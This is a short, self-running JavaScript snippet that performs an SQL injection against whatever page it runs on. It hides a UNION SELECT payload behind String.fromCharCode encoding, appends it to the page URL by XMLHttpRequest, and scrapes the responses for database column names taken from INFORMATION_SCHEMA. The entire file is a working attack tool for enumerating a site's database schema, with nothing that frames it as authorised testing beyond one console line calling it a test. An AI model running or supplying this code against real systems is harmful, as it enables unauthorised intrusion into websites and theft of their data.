(function() {
    var s = String.fromCharCode;

    // Updated targeted payload to retrieve column names more accurately
    var payloads = [
        s(39) + s(32) + s(85) + s(78) + s(73) + s(79) + s(78) + s(32) + s(83) + s(69) + s(76) + s(69) + s(67) + s(84) + s(32) + 
        s(67) + s(79) + s(76) + s(85) + s(77) + s(78) + s(95) + s(78) + s(65) + s(77) + s(69) + s(32) + 
        s(70) + s(82) + s(79) + s(77) + s(32) + s(73) + s(78) + s(70) + s(79) + s(82) + s(77) + s(65) + s(84) + s(73) + s(79) + 
        s(78) + s(95) + s(83) + s(67) + s(72) + s(69) + s(77) + s(65) + s(46) + s(67) + s(79) + s(76) + s(85) + s(77) + s(78) + 
        s(83) + s(32) + s(87) + s(72) + s(69) + s(82) + s(69) + s(32) + s(84) + s(65) + s(66) + s(76) + s(69) + s(95) + s(78) + 
        s(65) + s(77) + s(69) + s(32) + s(61) + s(39) + s(116) + s(97) + s(98) + s(108) + s(101) + s(95) + s(110) + s(97) + s(109) + s(101) + s(39) + s(32) + s(45) + s(45)
    ];

    var retrievedColumns = []; // Array to store retrieved columns

    function sendPayload(payload, callback) {
        var xhr = new XMLHttpRequest();
        xhr.open('GET', window.location.href + encodeURIComponent(payload), true);
        xhr.onreadystatechange = function() {
            if (xhr.readyState === 4) {
                console.log('Response for payload "' + payload + '":\n\n' + xhr.responseText);
                if (typeof callback === 'function') callback(xhr.responseText);
            }
        };
        xhr.send();
    }

    function executeSqli() {
        var i = 0;

        function handleResponse(response) {
            // More targeted regex for typical SQL column names, ignoring common HTML/JS terms
            var regex = /\b([A-Za-z_][A-Za-z0-9_]*?)\b(?!\s*[\:\(\{])/gi;
            var match;
            while ((match = regex.exec(response)) !== null) {
                var column = match[1];
                if (isValidColumn(column) && !retrievedColumns.includes(column)) {
                    retrievedColumns.push(column);
                }
            }

            if (i < payloads.length) {
                sendPayload(payloads[i], handleResponse);
                i++;
            } else {
                console.log("SQL injection test completed.");
                displayRetrievedColumns();
            }
        }

        function isValidColumn(column) {
            // Exclude common CSS, JavaScript, and SQL keyword terms
            var invalidTerms = ['and', 'or', 'select', 'from', 'where', 'null', 'true', 'false', 'margin', 'padding', 'font', 'background', 'color', 'width', 'height', 'url', 'right', 'overflow', 'decoration', 'border', 'top', 'left', 'resolution', 'image', 'ratio', 'size', 'display'];
            return !invalidTerms.includes(column.toLowerCase());
        }

        function displayRetrievedColumns() {
            if (retrievedColumns.length > 0) {
                console.log("\n=== Retrieved Columns ===");
                retrievedColumns.forEach(function(column) {
                    console.log(column);
                });
            } else {
                console.log("No columns retrieved. The response may not have included column information.");
            }
        }

        sendPayload(payloads[i], handleResponse);
        i++;
    }

    executeSqli();
})();
